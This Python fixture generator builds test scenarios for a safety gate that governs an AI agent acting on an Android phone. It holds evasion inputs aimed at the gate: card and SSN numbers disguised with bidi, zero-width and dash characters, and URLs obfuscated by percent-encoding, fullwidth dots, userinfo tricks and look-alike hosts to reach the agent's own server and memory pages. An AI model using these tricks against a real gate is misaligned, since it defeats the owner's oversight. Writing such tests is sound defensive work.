    "r2_notes_owner_card_cursor_mid": screen(app(NOTES, [node(text="Card 4111 1111 1111 1111 and ", id=f"{NOTES}:id/body",
                                                              cls="android.widget.EditText", editable=True, focused=True,
                                                              bounds=(0, 200, W, 400), sel_start=29, sel_end=29)]),
                                             labels=LABELS),
    "r2_tie_send_over_unlabeled": screen(app(SHOP, [
        button("Send", f"{SHOP}:id/send_gift", (40, 2050, 1040, 2200)),
        node(cls="android.widget.FrameLayout", bounds=(0, 1800, W, H), clickable=True)]), labels=LABELS),
})
SCENARIOS += [
    sc("review 2 L2: a card number built by typing its tail, then its head at the cursor, asks", [
        step("type_text", "r2_notes_tail_cursor_at_start", SENSITIVE, text="4111 1111 1111 ", **NOTE_TASK),
        step("type_text", "r2_notes_owner_card_cursor_mid", SENSITIVE, text="5555 5555 5555 4444", **NOTE_TASK),
        step("type_text", "r2_notes_owner_card_cursor_mid", allow(), text="thanks", **NOTE_TASK)],
       tags=["sensitive", "review2_2026_10_17"]),
    sc("review 2 L3: a duration, coordinate or flag that isn't a real number or boolean is refused", [
        step("swipe", "dialer_google", refuse("gate_bad_params", rule="builtin:bad_params"), x1=540, y1=2075, x2=540,
             y2=1500, duration_ms="NaN"),
        step("swipe", "dialer_google", refuse("gate_bad_params", rule="builtin:bad_params"), x1=540, y1=2075, x2=540,
             y2=1500, duration_ms=-5),
        step("tap", "dialer_google", refuse("gate_bad_params", rule="builtin:bad_params"), x="540", y=2075),
        step("type_text", "m4_notes_empty", refuse("gate_bad_params", rule="builtin:bad_params"), text="hi",
             replace="true"),
        step("swipe", "dialer_google", ask("call", rule="risk:call:dial"), x1=540, y1=2075, x2=540, y2=1500,
             duration_ms=100)],
       tags=["review2_2026_10_17"]),
    sc("review 2 I-3: on a tie, the prompt names the labeled control, not an unlabeled spot", [
        step("tap", "r2_tie_send_over_unlabeled", ask("send", rule="risk:words:send"), x=540, y=2120, **R2_TASK)],
       tags=["review2_2026_10_17"]),
]
SENSITIVE_NUMBERS["texts"] += [
    {"text": t, "ssn_context": s, "card_field": False, "expect": e} for t, s, e in [
        ("4111\t1111\t1111\t1111", False, "card"),  # review 2 L4, 2026-10-17
        ("4111\n1111\n1111\n1111", False, "card"),
        ("4111,1111,1111,1111", False, "card"),
        ("4111:1111:1111:1111", False, "card"),
        ("4111 - 1111 - 1111 - 1111", False, "card"),
        ("4111​1111​1111​1111", False, "card"),
        ("4111⁠1111⁠1111⁠1111", False, "card"),
        ("+4111 1111 1111 1111", False, "card"),
        ("+4111111111111111", False, "card"),
        ("+491512345678901", False, None),  # 15 digits after +: a phone number
        ("+44 7911 123456", False, None),
        ("12:30:45", False, None),
        ("1,234,567,890", False, None),
        ("40.7128, -74.0060", False, None),
        ("123\t45\t6789", False, "ssn"),
        ("123 - 45 - 6789", False, "ssn"),
        ("SSN:123-45-6789", False, "ssn"),
    ]]
# Security review 4 L9 (the deferred F3-L2): other dashes, "|", "•" and direction marks between groups.
SENSITIVE_NUMBERS["texts"] += [
    {"text": t, "ssn_context": s, "card_field": False, "expect": e} for t, s, e in [
        ("4111–1111–1111–1111", False, "card"),  # en dash
        ("4111—1111—1111—1111", False, "card"),  # em dash
        ("4111−1111−1111−1111", False, "card"),  # minus sign
        ("4111‐1111‑1111―1111", False, "card"),  # hyphen, non-breaking hyphen, horizontal bar
        ("4111 – 1111 – 1111 – 1111", False, "card"),
        ("4111|1111|1111|1111", False, "card"),
        ("4111 | 1111 | 1111 | 1111", False, "card"),
        ("4111•1111•1111•1111", False, "card"),
        ("4111 • 1111 • 1111 • 1111", False, "card"),
        ("4111‎1111‏1111‎1111", False, "card"),  # LRM, RLM
        ("4111‪1111‫1111‬1111", False, "card"),  # bidi embeddings
        ("4111‭1111‮1111‬1111", False, "card"),  # bidi overrides
        ("4111⁦1111⁧1111⁨1111⁩", False, "card"),  # bidi isolates
        ("4111‎-‏1111-1111-1111", False, "card"),  # a mark on each side of a dash
        ("123–45–6789", False, "ssn"),
        ("123—45—6789", False, "ssn"),
        ("123−45−6789", False, "ssn"),
        ("123|45|6789", False, "ssn"),
        ("123 | 45 | 6789", False, "ssn"),
        ("123•45•6789", False, "ssn"),
        ("123‎45‎6789", False, "ssn"),
        ("123⁦-⁩45⁦-⁩6789", False, "ssn"),
        ("SSN|123-45-6789", False, "ssn"),  # "|" before it is not a dash
        # Ordinary text with these characters stays ordinary.
        ("pages 10–20", False, None),
        ("2026–10–18", False, None),
        ("415–555–2671", False, None),
        ("1–800–555–0199", False, None),
        ("Q3 | 2026 | 45%", False, None),
        ("Score 3 • 4 • 5", False, None),
        ("Room 12 | Floor 3 | Building 4", False, None),
        ("−122.4194, 37.7749", False, None),  # a coordinate with a minus sign
        ("4111–1111–1111–1112", False, None),  # Luhn fails
        ("123–45–6789–1", False, None),  # inside a longer dashed number
        ("1–123–45–6789", False, None),
        ("123–45 6789", True, None),  # mixed separators
        ("‎‏⁦", False, None),
    ]]


# --- security review 3 F3-M2 (owner, 2026-10-18: "intent + name"): a free install goes unasked only when the request
# the phone holds asks for an install and names the app (its leading distinctive name word and at least half of them).
# Reviewer F's PoC (poc_install_names.py): a shared everyday word named any listing that started with it.
def _store_page(title):
    return screen(app("com.android.vending", [
        node(text=title, bounds=(40, 300, 1040, 400)),
        button("Install", "com.android.vending:id/install_button", (40, 800, 1040, 920))]), labels=LABELS)


R3_STORE = {"r3_store_" + k: v for k, v in {
    "music_player": "Music Player - MP3 Pro", "photo_editor": "Photo Editor: AI Filters",
    "weather_casino": "Weather Live: Radar & Casino", "flight_casino": "Flight Tracker Casino",
    "pizza_slots": "Pizza Ready! Slots", "bank_robbery": "Bank Robbery Simulator", "email_vpn": "Email Cleaner VPN",
    "calendar_2027": "Calendar Planner 2027", "chess_casino": "Chess Casino Slots", "photos_vault": "Photos Lock Vault",
    "spotify": "Spotify: Music and Podcasts", "whatsapp": "WhatsApp Messenger"}.items()}
SCREENS.update({k: _store_page(v) for k, v in R3_STORE.items()})
_R3_UNNAMED = [("play some music", "music_player"), ("send a photo to mom", "photo_editor"),
               ("check the weather", "weather_casino"), ("what time is my flight", "flight_casino"),
               ("set a timer for my pizza", "pizza_slots"), ("call my bank", "bank_robbery"),
               ("read my email", "email_vpn"), ("open my calendar", "calendar_2027"),
               ("install chess", "chess_casino"), ("look at photos", "photos_vault"),
               ("open spotify", "spotify"), ("message mom on whatsapp", "whatsapp"),
               ("install the weather app", "weather_casino")]
_R3_NAMED = [("install Spotify", "spotify"), ("download WhatsApp", "whatsapp"),
             ("set up whatsapp messenger", "whatsapp"), ("get the spotify app", "spotify")]
SCENARIOS += [
    sc("review 3 F3-M2: a request that shares a word with a listing but doesn't ask to install it asks", [
        s for i, (text, page) in enumerate(_R3_UNNAMED) for s in (
            {"instruction": text},  # typed on the phone: attested (L2), so only the naming rule decides
            step("tap", "r3_store_" + page, ask("install", level="tap", rule="risk:install:unnamed"), x=540, y=860,
                 task=f"r3u{i}", task_text=text))], tags=["install", "review3"]),
    sc("review 3 F3-M2: an install the phone-held request asks for by name goes unasked", [
        s for i, (text, page) in enumerate(_R3_NAMED) for s in (
            {"instruction": text},
            step("tap", "r3_store_" + page, allow(), x=540, y=860, task=f"r3n{i}", task_text=text))],
       tags=["install", "review3"]),
    sc("review 3 F3-M2: a named install the phone doesn't hold the text of still asks once for the task (L2 kept)", [
        step("tap", "r3_store_spotify", ask("task", rule="risk:task:install:unattested"), x=540, y=860, task="r3x",
             task_text="install Spotify")], tags=["install", "task_grant", "review3"]),
]

# --- owner-added blocked apps (owner, 2026-10-20; docs/design/blocked-apps.md): the phone's own list of exact package
# names, on top of the built-in sensitive apps. Refused (rule owner:blocked_apps, which stops the task on the phone)
# and blacked out in every mode, Don't ask included. {"owner_blocked": [...]} sets the host's stored list.
OWNER_BLOCKED = "owner:blocked_apps"
SCENARIOS += [
    sc("blocked apps: an app the owner blocked is refused and blacked out in every mode", [
        {"owner_blocked": ["com.whatsapp", "com.google.android.gm", AMAZON]},
        step("launch_app", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), package="com.whatsapp"),
        step("launch_app", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), package="com.whatsapp",
             mode="trusted"),
        step("open_url", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), url="https://www.amazon.com/dp/B0"),
        step("open_settings", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), page="app_details",
             package="com.whatsapp"),
        step("screenshot", "whatsapp_chat", {"decision": "redact", "rule": OWNER_BLOCKED}),
        step("ui_elements", "gmail_list", {"decision": "redact", "rule": OWNER_BLOCKED}),
        step("wait_for", "gmail_list", {"decision": "redact", "rule": OWNER_BLOCKED}),
        step("stream_start", "whatsapp_chat", refuse("gate_blocked_app", rule=OWNER_BLOCKED)),
        step("tap", "gmail_list", refuse("gate_blocked_app", rule=OWNER_BLOCKED), x=540, y=400),
        step("tap", "gmail_list", refuse("gate_blocked_app", rule=OWNER_BLOCKED), x=540, y=400, mode="trusted"),
        step("swipe", "amazon_product", refuse("gate_blocked_app", rule=OWNER_BLOCKED), x1=540, y1=2200, x2=540,
             y2=700, duration_ms=300),
        step("type_text", "whatsapp_chat", refuse("gate_blocked_app", rule=OWNER_BLOCKED), text="hi"),
        {"policy": {"type": "never", "duration_ms": 3600000, "allow_money": True}, "sig": "valid",
         "expect_accepted": True},
        step("tap", "gmail_list", refuse("gate_blocked_app", rule=OWNER_BLOCKED), x=540, y=400),
        step("launch_app", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), package="com.whatsapp"),
        step("screenshot", "whatsapp_chat", {"decision": "redact", "rule": OWNER_BLOCKED}),
        step("tap", "settings_main", allow(), x=540, y=480),  # everything else as before
    ], tags=["blocked_apps"]),
    sc("blocked apps: matched by exact package name, nothing looser", [
        {"owner_blocked": ["com.whatsapp"]},
        step("launch_app", "launcher", allow(), package="com.whatsapp.w4b"),
        step("launch_app", "launcher", allow(), package="com.google.android.gm"),
        step("screenshot", "gmail_list", allow()),
        step("launch_app", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), package="com.whatsapp"),
    ], tags=["blocked_apps"]),
    sc("blocked apps: a built-in stays built-in when the owner also lists it", [
        {"owner_blocked": ["com.chase.sig.android"]},
        step("launch_app", "launcher", refuse("gate_blocked_app", rule="builtin:sensitive_apps"),
             package="com.chase.sig.android"),
        step("screenshot", "chase", {"decision": "redact", "rule": "builtin:sensitive_apps"}),
        {"owner_blocked": []},  # the owner's list can't lift a built-in
        step("launch_app", "launcher", refuse("gate_blocked_app", rule="builtin:sensitive_apps"),
             package="com.chase.sig.android"),
    ], tags=["blocked_apps"]),
    sc("blocked apps: the list survives a reboot, and only its removal on the phone unblocks", [
        {"owner_blocked": ["com.whatsapp"]},
        {"reboot": {"saved": True, "elapsed_after": 5000}},
        step("launch_app", "launcher", refuse("gate_blocked_app", rule=OWNER_BLOCKED), package="com.whatsapp"),
        {"owner_blocked": []},  # Unblock with the screen lock (BlockedApps.unblock)
        step("launch_app", "launcher", allow(), package="com.whatsapp"),
    ], tags=["blocked_apps"]),
]

# 2026-10-18: a task the owner typed on the phone ("open Google authenticator") opened Google Authenticator by tapping
# its home-screen icon, not launch_app. A tap in a launcher window (rules launcher_packages: icons, folders, the app
# drawer, Recents) on anything named after an installed blocked app is refused (its text or description up to a first
# comma is exactly the app's label); a phrase that merely contains it isn't, and outside the launcher a name is only a
# name (a contact called Chase). The act watch behind it (BlockedAppWatch) is the host's: BlockedAppWatchTest.
AUTH = "com.google.android.apps.authenticator2"
_BL_LABELS = {**LABELS, AUTH: "Authenticator"}
SAMSUNG_HOME = "com.sec.android.app.launcher"


def _icon(text, left, desc=None):
    return node(text=text, desc=text if desc is None else desc, cls="android.widget.TextView",
                bounds=(left, 1800, left + 270, 2000), clickable=True)


SCREENS.update({
    "bl_home": screen(app(SAMSUNG_HOME, [_icon("Authenticator", 0), _icon("Amazon", 270),
                                         _icon("", 540, desc="Authenticator, 1 notification"),
                                         _icon("WhatsApp", 810)]), labels=_BL_LABELS),
    "bl_recents": screen(app(SAMSUNG_HOME, [
        node(cls="android.widget.FrameLayout", bounds=(90, 400, 990, 1800), clickable=True, children=[
            node(text="Chase", bounds=(140, 420, 500, 500)), node(cls="android.widget.ImageView", bounds=(90, 520, 990, 1800))])
    ]), labels=_BL_LABELS),
    "bl_folder": screen(app(SAMSUNG_HOME, [_icon("Amazon", 0)]),
                        app(SAMSUNG_HOME, [node(cls="android.widget.FrameLayout", bounds=(100, 800, 980, 1400), children=[
                            node(text="Authenticator", desc="Authenticator", bounds=(140, 900, 410, 1100), clickable=True)])],
                            id=2, layer=2), labels=_BL_LABELS),
    "bl_chrome": screen(app("com.android.chrome", [
        node(text="How to set up Google Authenticator on a new phone", bounds=(40, 900, 1040, 1000), clickable=True),
    ]), labels=_BL_LABELS),
    # Names outside the launcher: a contact called Chase, a WhatsApp chat named "Authenticator".
    "bl_contacts": screen(app("com.google.android.contacts", [
        node(cls="android.widget.LinearLayout", bounds=(0, 400, W, 560), clickable=True, children=[
            node(text="Chase", bounds=(140, 440, 600, 520))])]), labels=_BL_LABELS),
    "bl_messages": screen(app("com.google.android.apps.messaging", [
        node(cls="android.widget.LinearLayout", bounds=(0, 400, W, 560), clickable=True, children=[
            node(text="Authenticator", bounds=(140, 440, 600, 520)), node(text="Your code is 123456", bounds=(140, 520, 900, 556))])]),
        labels=_BL_LABELS),
})
SCREENS["bl_folder"]["windows"][1]["bounds"] = [100, 800, 980, 1400]
BL = dict(rule="builtin:sensitive_app_name")
SCENARIOS += [
    sc("a tap on a blocked app's home-screen icon is refused (Google Authenticator, 2026-10-18)", [
        step("tap", "bl_home", refuse("gate_blocked_app", **BL), x=135, y=1900),
        step("long_press", "bl_home", refuse("gate_blocked_app", **BL), x=135, y=1900),
        step("tap", "bl_home", refuse("gate_blocked_app", **BL), x=135, y=1900, mode="trusted"),
    ], tags=["blocked_name"]),
    sc("an icon whose description names a blocked app with a badge is refused", [
        step("tap", "bl_home", refuse("gate_blocked_app", **BL), x=675, y=1900)], tags=["blocked_name"]),
    sc("a Recents card for a blocked app is refused", [
        step("tap", "bl_recents", refuse("gate_blocked_app", **BL), x=540, y=1000)], tags=["blocked_name"]),
    sc("a blocked app's icon in an open folder is refused", [
        step("tap", "bl_folder", refuse("gate_blocked_app", **BL), x=275, y=1000)], tags=["blocked_name"]),
    sc("another app's icon next to a blocked one still opens", [
        step("tap", "bl_home", allow(), x=405, y=1900),
        step("tap", "bl_home", allow(), x=945, y=1900)], tags=["blocked_name"]),
    sc("a link that only mentions a blocked app's name isn't refused", [
        step("tap", "bl_chrome", allow(), x=540, y=950)], tags=["blocked_name"]),
    sc("outside the launcher a blocked app's name is only a name (a contact called Chase)", [
        step("tap", "bl_contacts", allow(), x=540, y=480),
        step("tap", "bl_messages", allow(), x=540, y=480)], tags=["blocked_name"]),
    sc("blocked apps: an owner-blocked app's home-screen icon is refused too", [
        {"owner_blocked": ["com.whatsapp"]},
        step("tap", "bl_home", refuse("gate_blocked_app", rule="owner:blocked_app_name"), x=945, y=1900),
        step("tap", "bl_home", allow(), x=405, y=1900),
        {"owner_blocked": []},
        step("tap", "bl_home", allow(), x=945, y=1900)], tags=["blocked_name", "blocked_apps"]),
]

# --- review 5 (2026-10-21) -----------------------------------------------------------------------------------------
# H1: the paired server's own pages in a browser (dashboard, developer console, memory). {"server": url} sets the
# phone's paired server (GateHost does it from the pairing). While a browser's address bar shows that host or a
# subdomain, taps, drags, typing, ENTER and DELETE are refused in every mode, never asked; open_url to it too. A page
# that only mentions the host (a search result) and look-alike hosts aren't.
SERVER = "https://openmob.example"
OWN_SERVER = dict(rule="builtin:own_server")


def _browser(pkg, url_id, url, page=()):
    return screen(app(pkg, [
        node(text=url, id=url_id, cls="android.widget.EditText", bounds=(150, 100, 900, 200)),
        node(cls="android.webkit.WebView", bounds=(0, 250, W, H), children=list(page)),
    ]), labels=LABELS)


_DASH_PAGE = [button("Add note", "", (300, 850, 780, 950)),
              node(text="", cls="android.widget.EditText", bounds=(40, 1100, 1040, 1200), editable=True, focused=True,
                   hint="Note")]
SCREENS.update({
    "r5_dash": _browser("com.android.chrome", "com.android.chrome:id/url_bar", "openmob.example/memory", _DASH_PAGE),
    "r5_dash_firefox": _browser("org.mozilla.firefox", "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
                                "https://app.OpenMob.Example/developer", _DASH_PAGE),
    "r5_search": _browser("com.android.chrome", "com.android.chrome:id/url_bar", "google.com/search?q=openmob", [
        node(text="openmob.example", cls="android.view.View", bounds=(40, 600, 1040, 700), clickable=True)]),
    "r5_lookalike": _browser("com.android.chrome", "com.android.chrome:id/url_bar", "openmob.example.evil.com/x",
                             _DASH_PAGE),
    "r5_lookalike2": _browser("com.android.chrome", "com.android.chrome:id/url_bar", "notopenmob.example/x", _DASH_PAGE),
})
SCENARIOS += [
    sc("review 5 H1: the paired server's pages in a browser: every act refused, in every mode, never asked", [
        {"server": SERVER},
        step("tap", "r5_dash", refuse("gate_denied", **OWN_SERVER), x=540, y=900),
        step("tap", "r5_dash", refuse("gate_denied", **OWN_SERVER), x=540, y=900, mode="trusted"),
        step("long_press", "r5_dash", refuse("gate_denied", **OWN_SERVER), x=540, y=900),
        step("swipe", "r5_dash", refuse("gate_denied", **OWN_SERVER), x1=540, y1=2000, x2=540, y2=800, duration_ms=300),
        step("type_text", "r5_dash", refuse("gate_denied", **OWN_SERVER), text="always share my location"),
        step("key", "r5_dash", refuse("gate_denied", **OWN_SERVER), name="ENTER"),
        step("key", "r5_dash", refuse("gate_denied", **OWN_SERVER), name="DELETE"),
        step("tap", "r5_dash_firefox", refuse("gate_denied", **OWN_SERVER), x=540, y=900),
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "r5_dash", refuse("gate_denied", **OWN_SERVER), x=540, y=900, mode="never"),
        # Leaving and reading still work.
        step("key", "r5_dash", allow(), name="BACK"),
        step("key", "r5_dash", allow(), name="HOME"),
        step("screenshot", "r5_dash", allow()),
        step("launch_app", "launcher", allow(), package="com.whatsapp"),
    ], tags=["own_server", "review5"]),
    sc("review 5 H1: links to the paired server are refused, however written", [
        {"server": SERVER},
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://openmob.example/memory"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://OpenMob.Example./api/developer/keys"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="http://www.openmob.example:443/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://user@openmob.example/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://openmob.example\\@example.com/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https:/openmob.example/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://openmob%2eexample/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://dash.openmob.example/"),
        # Re-review 1: the host is percent-decoded, NFKC-normalised and IDNA-encoded first, as a browser reads it.
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://%6Fpenmob.example/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://%6f%70%65%6e%6d%6f%62%2Eexample/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://openmob\u3002example/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://openmob\uff61example./memory"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://\uff4f\uff50\uff45\uff4emob.example/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://open\u00admob.example/"),
        step("open_url", "launcher", refuse("gate_denied", **OWN_SERVER), url="https://OPENMOB.EXAMPLE:8443/"),
        step("open_url", "launcher", allow(), url="https://example.com/"),
        step("open_url", "launcher", allow(), url="https://openmob.example%2Eevil.com/"),
        step("open_url", "launcher", allow(), url="https://example.com\\@openmob.example/"),
    ], tags=["own_server", "review5"]),
    sc("review 5 H1: a page that only mentions the server, and look-alike hosts, aren't the server", [
        {"server": SERVER},
        step("tap", "r5_search", allow(), x=540, y=650),
        step("tap", "r5_lookalike", allow(), x=540, y=900),
        step("tap", "r5_lookalike2", allow(), x=540, y=900),
    ], tags=["own_server", "review5"]),
    sc("review 5 H1: without a paired server nothing changes", [
        step("tap", "r5_dash", allow(), x=540, y=900),
        step("open_url", "launcher", allow(), url="https://example.com/"),
    ], tags=["own_server", "review5"]),
]

# P5-M1: notifications. (a) A notification's action (reply, an inline button) and ENTER in its reply field always ask
# (refused under Don't ask), never under everyday, a task approval or a grant. (b) A row whose header app name is an
# installed blocked app's label: acts refused (owner-blocked: the task stops, as for the app), reads blacked out (the
# task goes on). (c) A tap in a home-screen widget that names a blocked app is refused like its icon.
MESSAGES = "com.google.android.apps.messaging"
_R5_LABELS = {**LABELS, MESSAGES: "Messages"}
OWNER_NOTE = "owner:blocked_app_notification"


def _notif_row(app_name, title, text, top, action, reply=None):
    kids = [node(text=app_name, id="android:id/app_name_text", bounds=(140, top + 20, 400, top + 70)),
            node(text=title, id="android:id/title", bounds=(140, top + 80, 900, top + 130)),
            node(text=text, id="android:id/text", bounds=(140, top + 140, 900, top + 190)),
            button(action, "android:id/action0", (40, top + 220, 400, top + 290))]
    if reply is not None:
        kids.append(node(text=reply, id="com.android.systemui:id/remote_input_text", cls="android.widget.EditText",
                         bounds=(40, top + 220, 900, top + 290), editable=True, focused=True))
        kids.pop(3)
    return node(cls="android.widget.FrameLayout", bounds=(0, top, W, top + 300), clickable=True, children=kids)


def _shade(*rows):
    return {"id": 9, "type": "system", "layer": 9, "package": "com.android.systemui", "title": "Notification shade",
            "bounds": FULL, "root": node(cls="android.widget.FrameLayout", bounds=FULL, children=list(rows))}


SCREENS.update({
    "r5_shade": screen(app("com.android.settings", []), _shade(
        _notif_row("WhatsApp", "Mom", "see you at 6", 300, "Reply"),
        _notif_row("Messages", "Dad", "call me", 700, "Mark as read")), labels=_R5_LABELS),
    "r5_shade_chase": screen(app("com.android.settings", []), _shade(
        _notif_row("Chase", "Card alert", "A $500 charge", 300, "Lock card")), labels=_R5_LABELS),
    "r5_reply_whatsapp": screen(app("com.android.settings", []), _shade(
        _notif_row("WhatsApp", "Mom", "see you at 6", 300, "Reply", reply="ok")), labels=_R5_LABELS),
    "r5_reply_messages": screen(app("com.android.settings", []), _shade(
        _notif_row("Messages", "Dad", "call me", 700, "Reply", reply="ok")), labels=_R5_LABELS),
    "r5_statusbar": screen(app("com.android.settings", [row("Display", 420)]),
                           {"id": 9, "type": "system", "layer": 9, "package": "com.android.systemui", "title": "",
                            "bounds": [0, 0, W, 100], "root": node(cls="android.widget.FrameLayout", bounds=(0, 0, W, 100),
                                children=[node(desc="WhatsApp notification: Mom", id="com.android.systemui:id/icon",
                                               bounds=(40, 10, 100, 90))])}, labels=_R5_LABELS),
    "r5_widgets": screen(app(SAMSUNG_HOME, [
        node(cls="android.appwidget.AppWidgetHostView", bounds=(0, 300, W, 900), children=[
            node(text="Chase", bounds=(100, 320, 500, 400)),
            button("Lock card", "", (100, 700, 500, 850))]),
        node(cls="android.appwidget.AppWidgetHostView", bounds=(0, 1000, W, 1500), children=[
            node(text="Weather", bounds=(100, 1020, 500, 1100)),
            button("Refresh", "", (100, 1300, 500, 1450))]),
    ]), labels=_BL_LABELS),
})
SCENARIOS += [
    sc("review 5 P5-M1: a notification's action always asks, even with everyday on or a task approved", [
        step("tap", "r5_shade", ask("notification", level="tap", rule="risk:notification_action"), x=200, y=955),
        EVERYDAY,
        step("tap", "r5_shade", ask("notification", level="tap", rule="risk:notification_action"), x=200, y=955),
        {"instruction": "mark dad's message as read"},
        step("tap", "r5_shade", ask("notification", level="tap", rule="risk:notification_action"), x=200, y=955,
             task="r5n", task_text="mark dad's message as read"),
        step("key", "r5_reply_messages", ask("notification", level="tap", rule="risk:notification_action"),
             name="ENTER"),
        step("type_text", "r5_reply_messages", allow(), text=" soon"),
    ], tags=["notifications", "review5"]),
    sc("review 5 P5-M1: under Don't ask a notification's action is refused (nobody can be asked)", [
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "r5_shade", refuse("gate_denied", rule="never:notification_action"), x=200, y=955, mode="never"),
        step("key", "r5_reply_messages", refuse("gate_denied", rule="never:notification_action"), name="ENTER",
             mode="never"),
    ], tags=["notifications", "review5"]),
    sc("review 5 P5-M1: a blocked app's notification: acts refused (the task stops), reads blacked out", [
        {"owner_blocked": ["com.whatsapp"]},
        step("tap", "r5_shade", refuse("gate_blocked_app", rule=OWNER_NOTE), x=200, y=555),  # Reply
        step("tap", "r5_shade", refuse("gate_blocked_app", rule=OWNER_NOTE), x=540, y=430),  # the row: opens it
        step("long_press", "r5_shade", refuse("gate_blocked_app", rule=OWNER_NOTE), x=540, y=430),
        step("swipe", "r5_shade", refuse("gate_blocked_app", rule=OWNER_NOTE), x1=100, y1=430, x2=1000, y2=430,
             duration_ms=300),
        step("type_text", "r5_reply_whatsapp", refuse("gate_blocked_app", rule=OWNER_NOTE), text="hi"),
        step("key", "r5_reply_whatsapp", refuse("gate_blocked_app", rule=OWNER_NOTE), name="ENTER"),
        step("screenshot", "r5_shade", {"decision": "redact", "rule": "builtin:blocked_notification"}),
        step("ui_elements", "r5_shade", {"decision": "redact", "rule": "builtin:blocked_notification"}),
        step("stream_start", "r5_shade", refuse("gate_blocked_app", rule="builtin:blocked_notification")),
        # Another app's row is a notification like any other; a status-bar icon naming the app isn't a row.
        step("tap", "r5_shade", ask("notification", level="tap"), x=200, y=955),
        step("screenshot", "r5_statusbar", allow()),
        {"owner_blocked": []},
        step("screenshot", "r5_shade", allow()),
        step("tap", "r5_shade", ask("notification", level="tap"), x=200, y=555),
    ], tags=["notifications", "blocked_apps", "review5"]),
    sc("review 5 P5-M1: a built-in sensitive app's notification is refused and blacked out too", [
        step("tap", "r5_shade_chase", refuse("gate_blocked_app", rule="builtin:sensitive_notification"), x=200, y=555),
        step("tap", "r5_shade_chase", refuse("gate_blocked_app", rule="builtin:sensitive_notification"), x=540, y=430,
             mode="trusted"),
        step("screenshot", "r5_shade_chase", {"decision": "redact", "rule": "builtin:blocked_notification"}),
    ], tags=["notifications", "review5"]),
    sc("review 5 P5-M1: a tap in a blocked app's home-screen widget is refused like its icon", [
        step("tap", "r5_widgets", refuse("gate_blocked_app", rule="builtin:sensitive_app_name"), x=300, y=775),
        step("tap", "r5_widgets", allow(), x=300, y=1375),
        {"owner_blocked": ["com.whatsapp"]},
        step("tap", "r5_widgets", allow(), x=300, y=1375),
    ], tags=["blocked_name", "review5"]),
]

# Review 2 M3: on the phone, a tap on a drawn spot (no labeled clickable under it) is OCR'd. The fixtures' screens are
# what accessibility reads, with nothing drawn besides: their OCR read is empty unless a screen says otherwise (a list
# of lines, or None: the read failed).
for _scr in SCREENS.values():
    _scr.setdefault("canvas_ocr", [])


def main():
    (HERE / "sensitive_numbers.json").write_text(json.dumps(SENSITIVE_NUMBERS, indent=1, ensure_ascii=False) + "\n")
    (HERE / "screens.json").write_text(json.dumps(SCREENS, indent=1, ensure_ascii=False) + "\n")
    (HERE / "scenarios.json").write_text(json.dumps(SCENARIOS, indent=1, ensure_ascii=False) + "\n")
    (HERE / "adversarial.json").write_text(json.dumps(ADVERSARIAL, indent=1, ensure_ascii=False) + "\n")


if __name__ == "__main__":
    main()
